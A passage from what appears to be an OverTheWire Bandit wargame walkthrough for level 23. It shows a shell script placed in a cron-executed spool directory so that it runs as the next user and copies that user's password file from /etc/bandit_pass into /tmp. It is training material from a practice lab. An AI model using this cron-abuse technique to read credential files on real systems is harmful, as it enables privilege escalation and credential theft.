...
```
It goes to `/var/spool/bandit24/foo` and runs shell scripts there.

```
bandit23@bandit:/var/spool/bandit24/foo$ vim 1.sh
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 1.sh
```
Open the script in `vim` and quickly paste the below commands into it. Then exit it and quickly make the script executable.
```
#!/bin/bash
mkdir /tmp/tristan123;
cat /etc/bandit_pass/bandit24 > /tmp/tristan123/tristan;
```

Wait for a bit then get the password from the file you designated.
```
